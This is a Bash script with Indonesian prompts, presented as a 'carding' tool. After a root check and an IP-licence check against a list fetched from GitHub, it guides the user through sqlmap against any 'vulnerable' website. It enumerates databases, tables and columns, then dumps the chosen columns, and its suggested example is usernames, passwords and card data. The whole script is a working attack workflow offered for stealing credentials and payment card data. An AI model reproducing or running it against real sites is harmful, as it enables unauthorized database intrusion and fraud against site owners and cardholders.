#!/bin/bash

if [[ $USER != "root" ]]; then
	echo "Maaf, Anda harus menjalankan ini sebagai root"
	exit
fi

#MYIP=$(wget -qO- ipv4.icanhazip.com);

# get the VPS IP
#ip=`ifconfig venet0:0 | grep 'inet addr' | awk {'print $2'} | sed s/.*://`

MYIP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
#MYIP=$(ifconfig | grep 'inet addr:' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | cut -d: -f2 | awk '{ print $1}' | head -1)
if [ "$MYIP" = "" ]; then
	MYIP=$(wget -qO- ipv4.icanhazip.com)
fi
MYIP2="s/xxxxxxxxx/$MYIP/g";
ether=`ifconfig | cut -c 1-8 | sort | uniq -u | grep venet0 | grep -v venet0:`
if [[ $ether = "" ]]; then
        ether=eth0
fi

#vps="zvur";
vps="aneka";

#if [[ $vps = "zvur" ]]; then
	#source="http://"
#else
	source="https://raw.githubusercontent.com/yusuf-ardiansyah/y"
#fi

# go to root
cd

# check registered ip
wget -q -O IPcarding $source/debian7/IPcarding.txt
if ! grep -w -q $MYIP IPcarding; then
	echo "Maaf, hanya IP yang terdaftar yang bisa menggunakan script ini!"
	if [[ $vps = "zvur" ]]; then
		echo "Hubungi: editor YUSUF-ARDIANSYAH atau (082139743432)"
	else
		echo "Hubungi: editor YUSUF-ARDIANSYAH atau (082139743432)"
	fi
	rm /root/IPcarding
	exit
fi

# carding
cd /root
cd sqlmap
clear
read -p "Masukkan Link atau Web Yang Error (VULN): " cardinger
clear
./sqlmap.py -u $cardinger --random-agent --dbs
                echo "Jika terlihat ada database silahkan pilih lanjut."
		PS3='Silahkan pilih (1-2):'
options=("Lanjut" "Keluar (Jika GAGAL)")
select opt in "${options[@]}"
do
    case $opt in
        "Lanjut")
	break
	;;
	"Keluar (Jika GAGAL)")
	exit
	break
	;;
	 *) echo invalid option;
	esac
done
echo ""
read -p "Ketikkan DATABASE Yang Akan Di Buka: " databs
clear
./sqlmap.py -u $cardinger --random-agent -D $databs --tables
echo ""
echo "Jika terlihat ada table silahkan pilih lanjut."
		PS3='Silahkan pilih (1-2):'
options=("Lanjut" "Keluar (Jika GAGAL)")
select opt in "${options[@]}"
do
    case $opt in
        "Lanjut")
	break
	;;
	"Keluar (Jika GAGAL)")
	exit
	break
	;;
	 *) echo invalid option;
	esac
done
read -p "Ketikkan Table Yang Akan Di Buka: " tabledd
clear
./sqlmap.py -u $cardinger --random-agent -D $databs -T $tabledd --columns
echo ""
echp "Jika terlihat ada columns silahkan lanjut."
		PS3='Silahkan pilih (1-2):'
options=("Lanjut" "Keluar (Jika GAGAL)")
select opt in "${options[@]}"
do
    case $opt in
        "Lanjut")
	break
	;;
	"Keluar (Jika GAGAL)")
	exit
	break
	;;
	 *) echo invalid option;
	esac
done
echo "Contoh: UserName,UserPass,Card (Pisahkan Dengan Koma)"
read -p "Ketikkan Nama Data Yang Mau Di Ambil: " colums

./sqlmap.py -u $cardinger --random-agent -D $databs -T $tabledd -C $colums --dump
echo "SEKIAN SEMOGA SUKSES BOSS!!!"
